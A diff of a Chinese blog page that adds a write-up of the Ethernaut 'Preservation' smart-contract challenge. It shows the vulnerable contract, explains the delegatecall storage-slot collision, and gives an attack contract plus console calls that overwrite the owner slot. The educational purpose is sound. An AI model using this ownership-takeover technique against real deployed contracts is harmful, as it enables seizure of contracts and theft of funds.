@@ -27,7 +27,7 @@
 <meta property="og:image" content="http://xiaoxiaoxiaoxiaocai.github.io.com/images/%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE%202023-11-29%20222116.png">
 <meta property="og:image" content="http://xiaoxiaoxiaoxiaocai.github.io.com/images/%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE%202023-11-29%20222139.png">
 <meta property="article:published_time" content="2023-11-27T08:28:03.000Z">
-<meta property="article:modified_time" content="2024-04-10T13:40:35.898Z">
+<meta property="article:modified_time" content="2024-04-14T06:26:06.419Z">
 <meta property="article:author" content="xiaocai">
 <meta name="twitter:card" content="summary_large_image">
 <meta name="twitter:image" content="http://xiaoxiaoxiaoxiaocai.github.io.com/images/%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE%202023-11-27%20175711.png">
@@ -223,7 +223,7 @@
       <span class="post-meta mr-2">
         <i class="iconfont icon-chart"></i>
         
-          9.2k words
+          12k words
         
       </span>
     
@@ -234,7 +234,7 @@
         
         
         
-          77 mins
+          101 mins
         
       </span>
     
@@ -347,6 +347,29 @@
 <p>但是转帐前，需要approver授权。</p>
 <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs solidity">//secondaddr是另外一个账户地址<br>secondad=&#x27;0x02823a3D576A35988a623BB3d7F9e9A6D0ae7674&#x27;<br>totalvalue=&#x27;1000000000000000000000000&#x27;<br>//给自己授权<br>await contract.approve(player,totalvalue)<br>await contract.transferFrom(player,secondaddr,totalvalue)<br></code></pre></td></tr></table></figure>
 
+
+
+
+
+
+
+<h3 id="Preservation"><a href="#Preservation" class="headerlink" title="Preservation"></a><strong>Preservation</strong></h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><code class="hljs solidity">// SPDX-License-Identifier: MIT<br>pragma solidity ^0.8.0;<br><br>contract Preservation &#123;<br>    // public library contracts<br>    address public timeZone1Library;<br>    address public timeZone2Library;<br>    address public owner;<br>    uint256 storedTime;<br>    // Sets the function signature for delegatecall<br>    bytes4 constant setTimeSignature = bytes4(keccak256(&quot;setTime(uint256)&quot;));<br><br>    constructor(address _timeZone1LibraryAddress, address _timeZone2LibraryAddress) &#123;<br>        timeZone1Library = _timeZone1LibraryAddress;<br>        timeZone2Library = _timeZone2LibraryAddress;<br>        owner = msg.sender;<br>    &#125;<br><br>    // set the time for timezone 1<br>    function setFirstTime(uint256 _timeStamp) public &#123;<br>        timeZone1Library.delegatecall(abi.encodePacked(setTimeSignature, _timeStamp));<br>    &#125;<br><br>    // set the time for timezone 2<br>    function setSecondTime(uint256 _timeStamp) public &#123;<br>        timeZone2Library.delegatecall(abi.encodePacked(setTimeSignature, _timeStamp));<br>    &#125;<br>&#125;<br><br>// Simple library contract to set the time<br>contract LibraryContract &#123;<br>    // stores a timestamp<br>    uint256 storedTime;<br><br>    function setTime(uint256 _time) public &#123;<br>        storedTime = _time;<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure>
+
+<p>要求获得合约所有权。</p>
+<p>本题的关键就是delegatecall函数，该函数调用后内置变量 <code>msg</code> 的值不会修改为调用者，但执行环境为调用者的运行环境（相当于复制被调用者的代码到调用者合约）。也就是说</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs solidity"> function setFirstTime(uint256 _timeStamp) public &#123;<br>        timeZone1Library.delegatecall(abi.encodePacked(setTimeSignature, _timeStamp));<br>    &#125;<br>function setSecondTime(uint256 _timeStamp) public &#123;<br>        timeZone2Library.delegatecall(abi.encodePacked(setTimeSignature, _timeStamp));<br>    &#125;<br></code></pre></td></tr></table></figure>
+
+<p>当这两个函数调用时，他们改变的是slot0的变量，而我们要求改变合约的拥有者，即slot2处的变量。而这两个合约的变量分布为</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><code class="hljs solidity">===================================================<br>    unused       |                timeZone1Library<br>---------------------------------------------------         slot 0<br>    12 bytes     |                20 bytes<br>===================================================<br>    unused       |                timeZone2Library<br>---------------------------------------------------         slot 1<br>    12 bytes     |                20 bytes<br>===================================================<br>    unused       |                owner<br>---------------------------------------------------         slot 2<br>    12 bytes     |                20 bytes<br>===================================================<br>                storedTime<br>---------------------------------------------------         slot 3<br>                32 bytes<br>===================================================<br></code></pre></td></tr></table></figure>
+
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs solidity">===================================================<br>                storedTime<br>---------------------------------------------------         slot 0<br>                32 bytes<br>===================================================<br></code></pre></td></tr></table></figure>
+
+<p>所以当我们调用setFirstTime函数时，我们调用的是setTime函数。因此，我们可以将timeZone1Library的地址改为攻击合约的地址，然后在攻击合约中写一个setime函数，当执行imeZone1Library.delegatecall(abi.encodePacked(setTimeSignature, _timeStamp));时，就可以调用攻击合约的setime函数。</p>
+<p>我们需要注意owner占据slot2 的低20个字节即可</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs solidity">pragma solidity ^0.8.0;<br><br>contract AttackPreservation &#123;<br><br>    // stores a timestamp<br>    address doesNotMatterWhatThisIsOne;<br>    address doesNotMatterWhatThisIsTwo;<br>    address maliciousIndex;<br><br>    function setTime(uint _time) public &#123;<br>        maliciousIndex = address(uint160(_time));<br>    &#125;<br>&#125;<br><br></code></pre></td></tr></table></figure>
+
+<p>部署完成后，执行await contract.setFirstTime(‘攻击合约’)</p>
+<p>然后再执行 await contract.setFirstTime(‘player’)就可以了。</p>
 
                 
               </div>
